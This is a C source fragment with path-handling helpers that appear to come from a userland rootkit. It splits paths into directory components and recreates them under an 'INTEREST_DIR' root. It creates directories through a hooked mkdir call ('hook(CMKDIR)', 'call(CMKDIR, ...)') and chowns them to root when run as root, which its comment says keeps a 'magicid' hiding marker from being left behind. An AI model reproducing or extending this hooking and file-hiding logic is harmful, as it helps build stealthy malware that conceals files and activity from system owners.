/* iterates through each directory component in path & stores each individually in an array.
 * resulting array is returned at the end. cdir is updated with the dir count before returning. */
char **getdirstructure(const char *path, int *cdir){
    char **dirs = calloc(MAXDIRS, sizeof(char*));
    if(!dirs) return NULL;

    char *targetpath = NULL;
    if(*path != '/'){
        char *cwd = getcwd(NULL, 0);
        if(!cwd){
            free(dirs);
            return NULL;
        }
        targetpath = fullpath(cwd, path);
        clean(cwd);
        if(!targetpath){
            free(dirs);
            return NULL;
        }
    }else targetpath = strdup(path);

    if(!targetpath){
        free(dirs);
        return NULL;
    }

    /* store each directory component in targetpath. */
    char *p = strtok(targetpath, "/");
    *cdir = 0;
    while(p != NULL && *cdir < MAXDIRS){
        dirs[*cdir] = strdup(p);
        if(!dirs[*cdir]){
            clean(targetpath);
            *cdir != 0 ? freedirs(dirs, *cdir) : 0;
            return NULL;
        }else ++*cdir;
        p = strtok(NULL, "/");
    }
    clean(targetpath);

    return dirs;
}

/* within rootdir (INTEREST_DIR) create the full string for the new path, based on the contents of the dirs array. */
char *createdirstructure(const char *rootdir, const char *path, char **dirs, const int cdir){
    const size_t rootlen = strlen(rootdir);
    char fullpath[rootlen + strlen(path) + 128];
    size_t buflen = 0;

    memset(fullpath, 0, sizeof(fullpath));
    strcat(fullpath, rootdir); // rootdir belongs at beginning.
    buflen = rootlen + 1;

    for(int i = 0; i < cdir-1; i++){
        const size_t tmpsize = strlen(dirs[i]) + 2;
        if(tmpsize+buflen >= sizeof(fullpath)-1)
            break;

        char tmp[tmpsize];
        snprintf(tmp, tmpsize, "/%s", dirs[i]);
        strcat(fullpath, tmp); 
        buflen += tmpsize-1;
    }
    fullpath[buflen - 1] = '/';

    char *pathdup = strdup(path),
         *filename = basename(pathdup);
    strcat(fullpath, filename);
    fullpath[buflen + strlen(filename)] = '\0';
    clean(pathdup);

    return strdup(fullpath);
}

/* within rootdir (INTEREST_DIR) make all directories for the directory structure which is based on the contents of the dirs array.
 * if the calling process is root & has created a new directory within the specified structure, it will chown 0:0 $path. otherwise, the magicid would be left behind. */
int mkdirstructure(const char *rootdir, char **dirs, const int cdir){
    const size_t rootlen = strlen(rootdir);
    char current[PATH_MAX];
    size_t cursize;
    int mr;

    hook(CMKDIR);

    memset(current, 0, sizeof(current));
    strcat(current, rootdir);
    current[rootlen] = '/';
    cursize = rootlen + 2;

    for(int i = 0; i < cdir-1; i++){
        const size_t tmpsize = strlen(dirs[i]) + 2;
        if(tmpsize+cursize >= sizeof(current)-1)
            break;

        char tmp[tmpsize];
        snprintf(tmp, tmpsize, "%s/", dirs[i]);
        strcat(current, tmp);
        cursize += tmpsize-1;

        mr = (long)call(CMKDIR, current, 0777);
        if(mr != -1 && !notuser(0)) chownpath(current, 0);
        else if(mr < 0 && errno != EEXIST) return -1;
    }

    return 1;
}

void freedirs(char **dirs, const int cdir){
    for(int i = 0; i < cdir; i++)
        clean(dirs[i]);
    free(dirs);
}